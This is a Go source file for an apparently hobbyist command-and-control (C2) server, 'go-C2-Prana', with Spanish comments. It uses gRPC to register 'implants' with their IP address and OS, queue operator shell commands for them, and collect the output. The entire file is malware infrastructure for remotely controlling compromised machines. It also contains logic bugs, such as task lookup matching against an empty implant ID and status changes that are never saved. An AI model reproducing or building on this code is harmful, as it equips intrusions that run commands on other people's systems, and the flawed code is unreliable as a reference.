package main

import (
	"context"
	"errors"
	"fmt"
	"github.dev/nireitdev/go-C2-Prana/internal/Task"
	proto2 "github.dev/nireitdev/go-C2-Prana/internal/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection"
	"log"
	"log/slog"
	"net"
	"os"
)

var (
	SERVERIP   = "127.0.0.1"
	SERVERPORT = "3000"
)

type Server struct {
	listen   string
	implants map[string]Implant
	tasklist *Task.TaskList
	proto2.UnimplementedServerServer
}

func NewServer() (Server, error) {
	implants := make(map[string]Implant)
	srv := Server{
		listen:   "127.0.0.1:3000", //default
		implants: implants,
		tasklist: Task.NewTaskList(),
	}
	return srv, nil
}

func (s *Server) AdminNewTask(ctx context.Context, req *proto2.Task) (*proto2.NewTaskResult, error) {
	//return nil, status.Errorf(codes.Unimplemented, "method ImplantCmd not implemented")
	task := Task.NewTask(req.TaskID, req.ImplantID, req.Command)
	s.tasklist.Tasks[task.TaskID] = *task

	//TODO: verificar que ImplantID todavia exista => caso contario proto2.TaskStatus_IMPLANTLOST
	return &proto2.NewTaskResult{Status: proto2.TaskStatus_NEWTASKOK}, nil
}

func (s *Server) AdminGetTask(ctx context.Context, taskid *proto2.TaskId) (*proto2.Task, error) {
	task, ok := s.tasklist.Tasks[taskid.TaskId]
	if !ok {
		return nil, errors.New("ID no existe") //FIXME: usar errores predefenidos
	}

	ret := &proto2.Task{
		TaskID:    task.TaskID,
		ImplantID: task.ImplantID,
		Command:   task.Command,
		Status:    proto2.TaskStatus_NEWTASKOK, //FIXME: unificar estados con los de task.States
		Result:    task.Result,
	}
	return ret, nil

}

func (s *Server) ImplantGetTask(ctx context.Context, empty *proto2.Empty) (*proto2.Task, error) {
	//busco una tarea sin realizar para el ImplantID
	//TODO: Por ahora una sola tarea a la vez. Ver GRPC "Stream"
	ts := proto2.Task{}
	for _, task := range s.tasklist.Tasks {
		if task.ImplantID == ts.ImplantID {
			if task.StatusRun == Task.WAITINGTORUN {
				log.Println("nueva tarea")
				ts.TaskID = task.TaskID
				ts.Command = task.Command
				ts.ImplantID = task.ImplantID
				task.StatusRun = Task.RUNNING //task enviado
				break
			}
		}
	}
	return &ts, nil
}

func (s *Server) ImplantResultTask(ctx context.Context, res *proto2.Task) (*proto2.Empty, error) {
	log.Println("Recibido desde Implant: ", res.TaskID)
	//cargo el resultado de la tarea en mi listado:
	if res.TaskID != "" {
		ts := s.tasklist.Tasks[res.TaskID]
		ts.Result = res.Result
		ts.StatusRun = Task.RUNNEDOK
		log.Printf("resultado ultimo task: %v \n", s.tasklist.Tasks[res.TaskID])
		s.tasklist.Tasks[res.TaskID] = ts
	}

	return &proto2.Empty{}, nil
}

func (s *Server) ImplantAlive(ctx context.Context, alive *proto2.AliveMsg) (*proto2.Empty, error) {
	implant := Implant{ID: alive.ImplantID, IpAddr: alive.IpAddr, OS: alive.OS}
	_, ok := s.implants[implant.ID]
	if !ok {
		log.Printf("New implant: %v \n", implant)
	} else {
		log.Printf("Implant %s its alive! \n", implant.ID)
	}
	s.implants[implant.ID] = implant
	return nil, nil
}

type Implant struct {
	ID     string
	IpAddr string //remote ip address
	OS     string //remote operating system
}

func main() {

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	var err error

	srv, err := NewServer()
	if err != nil {
		log.Fatalf("Falla creacion del servidor. Imposible continuar. \n")
	}

	go srv.tasklist.PrintTaskListInfo()
	srv.listen = fmt.Sprintf("%s:%s", SERVERIP, SERVERPORT)
	slog.Info("Iniciando conexion Servidor...", "addr", srv.listen)
	listen, err := net.Listen("tcp", srv.listen)
	if err != nil {
		log.Fatalln("Imposible crear listener")
	}
	defer listen.Close()
	log.Println("Iniciando server en: ", srv.listen)

	grpcServer := grpc.NewServer()

	reflection.Register(grpcServer) //TODO: habilitar solo en Development mode!

	proto2.RegisterServerServer(grpcServer, &srv)
	if err = grpcServer.Serve(listen); err != nil {
		log.Fatalln("Error abriendo socket")
	}

}
